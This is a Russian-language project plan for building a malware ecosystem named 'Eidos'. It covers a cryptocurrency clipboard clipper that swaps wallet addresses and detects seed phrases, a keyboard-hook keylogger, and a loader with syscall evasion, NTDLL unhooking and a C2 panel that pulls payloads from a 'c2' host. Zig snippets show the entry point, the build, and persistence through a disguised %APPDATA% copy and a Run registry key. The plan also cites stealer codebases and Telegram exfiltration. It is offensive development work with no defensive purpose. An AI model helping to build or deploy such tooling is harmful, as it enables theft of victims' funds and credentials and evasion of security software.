# Phase 12: Eidos Ecosystem — Standalone Modules Plan

**Цель:** Завершить Eidos Clipper, задокументировать интеграцию с Eidos Loader, связать всё в экосистему.
**Всего задач:** 16 | **Оценка:** ~3 дня

---

## Текущее состояние

```
Phase 12
├── 12.1 Eidos Clipper — код на 70% (8 файлов в src/clipper/)
│   ├── config.zig ✅         — настройки
│   ├── scanner.zig ✅        — детектор адресов + seed фраз
│   ├── injector.zig ✅       — подмена в буфере обмена
│   ├── clipboard_monitor.zig ✅ — мониторинг изменений
│   ├── bip39_wordlist.zig ✅ — BIP39 wordlist
│   ├── persist.zig ✅        — персистентность
│   ├── config_decrypt.zig ✅ — расшифровка конфига
│   ├── log.zig ✅            — логирование
│   ├── main.zig ❌           — точка входа
│   └── build.zig ❌          — сборка
│
├── 12.2 Eidos Loader — существует отдельный проект
│   ├── D:\Develop...\loaders\EidosLoader\ — полный проект
│   └── Нужна интеграция с Mirage (деплой из стилера)
│
└── 12.3 Eidos Keylogger — ✅ готов
    ├── src/keylogger/keylogger.zig — WH_KEYBOARD_LL hook
    ├── config.zig — ENABLE_KEYLOGGER флаг
    └── Интегрирован в main.zig
```

---

## 12.1 Eidos Clipper (6 задач, ~1.5 дня)

### Что есть
Код clipper'а уже написан и лежит в `src/clipper/`. Это полноценный модуль на ~700 строк. Но:
- Нет `main.zig` — точки входа для отдельного EXE
- Нет `build.zig` — сборки как отдельного проекта
- Не интегрирован в main.zig Mirage (не вызывается при ENABLE_CLIPPER)

### Что нужно сделать

#### 1. Создать `src/clipper/main.zig`
Точка входа для отдельного бинарника Eidos Clipper:
```zig
const std = @import("std");
const scanner = @import("scanner.zig");
const injector = @import("injector.zig");
const persist = @import("persist.zig");

pub fn main() void {
    persist.install();
    injector.start(); // OpenClipboard polling loop
}
```

#### 2. Создать `clipper/build.zig`
Отдельный build.zig для сборки clipper как standalone EXE:
```zig
const std = @import("std");
pub fn build(b: *std.Build) void {
    const exe = b.addExecutable(.{
        .name = "EidosClipper",
        .root_module = b.createModule(.{ .root_source_file = b.path("src/clipper/main.zig"), ... }),
    });
    exe.subsystem = .Windows;
}
```

#### 3. Интегрировать в Mirage (main.zig)
Добавить флаг `ENABLE_CLIPPER` в `config.zig` и вызов в `main.zig`:
```zig
if (config.ENABLE_CLIPPER) {
    // Copy self to %APPDATA%\WindowsHelper.exe
    // Add to HKCU\...\Run
    // Launch EidosClipper.exe
}
```

#### 4. WireGuard / скрытие
Clipper должен копировать себя и запускаться как отдельный процесс (не жить внутри Mirage).

### Референсы в raw/
- `skuld\modules\clipper\clipper.go` — эталонная реализация клиппера
- `Stealerium\Stub\Clipper\Clipper.cs` — C# реализация
- `Stealerium\Stub\Helpers\ClipboardManager.cs` — STA thread clipboard

---

## 12.2 Eidos Loader (6 задач, ~1 день)

### Что есть
Готовый проект в `D:\Development\projects\Malware\loaders\EidosLoader\`:
- Полный syscall engine (Halo's Gate, NTDLL unhook)
- Module stomping execution
- DoH, SChannel TLS
- Builder + C2 server (tools/panel/)

### Что нужно сделать

#### 1. Документировать интеграцию
Clipper и Mirage должны быть deploy-пакетами для EidosLoader:
```
EidosLoader → HTTP GET → config
  ├── payload: Mirage.exe  (если ENABLE_MIRAGE)
  ├── payload: Clipper.exe (если ENABLE_CLIPPER)
  └── payload: Keylogger   (встроен в Mirage)
```

#### 2. Добавить конфиг для деплоя
Создать `eidos.toml` пример с несколькими payload:
```toml
[payloads]
mirage = { url = "https://c2/mirage.exe", run = "exe" }
clipper = { url = "https://c2/clipper.exe", run = "exe" }
```

#### 3. Builder integration
Панель должна уметь собирать:
- EidosLoader (один бинарник)
- Пакет с Mirage.exe + Clipper.exe

### Референсы в raw/
- `thebear\src\SendData.c` — low-level HTTP + execution
- `CloudStealer-v1\Templates\Stub\C2\C2Sender.cs.tmpl` — C2 communication
- `ferrox\src\communications\telegram.rs` — Telegram channel exfiltration

---

## Execution Order

```
Day 1: Clipper standalone binary
  ├─ clipper/build.zig — отдельная сборка
  ├─ clipper/main.zig — точка входа
  └─ проверка: zig build → EidosClipper.exe

Day 2: Clipper integration into Mirage
  ├─ config.zig — ENABLE_CLIPPER, CLIPPER_URL
  ├─ main.zig — деплой клиппера после сбора
  └─ тест: ENABLE_CLIPPER=true → clipper запущен

Day 3: EidosLoader integration
  ├─ docs/ — документация по деплою
  ├─ eidos.toml.example — конфиг для загрузчика
  └─ main.zig — опциональный запуск через EidosLoader

Day 4: Финализация
  ├─ Обновить roadmap.md
  ├─ Проверить все тесты
  └─ Commit
```

## Files Summary

### Новые файлы (2):
| File | Назначение |
|------|-----------|
| `clipper/main.zig` | Точка входа Eidos Clipper |
| `clipper/build.zig` | Сборка Eidos Clipper |

### Модифицируемые (4):
| File | Изменения |
|------|-----------|
| `src/config/config.zig` | +ENABLE_CLIPPER, +CLIPPER_URL |
| `src/main.zig` | +деплой клиппера |
| `docs/roadmap.md` | 12.1 → done, 12.2 → done |
